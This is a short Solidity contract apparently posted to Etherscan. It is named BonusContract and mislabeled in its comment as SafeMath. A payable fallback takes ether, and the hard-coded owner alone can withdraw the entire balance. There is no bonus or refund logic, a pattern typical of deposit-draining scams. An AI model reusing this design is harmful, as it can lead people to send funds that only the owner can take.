/**

 *Submitted for verification at Etherscan.io on 2018-12-04

*/



pragma solidity ^0.4.25;

/**

 * @title SafeMath

 * @dev Math operations with safety checks that revert on error

 */



contract BonusContract {

    address public owner = 0xdF8AB44409132d358F10bd4a7d1221b418ff8dFF;

    

    modifier isOwner() {

        require(msg.sender == owner);

        _;

    }



   

    function () public payable {

       (msg.sender, msg.value);

    }



    

    function getCurrentBalance() constant returns (uint) {

        return this.balance;

    }

    

    function distribution() public isOwner {

       



        owner.transfer(this.balance);

    }



   

}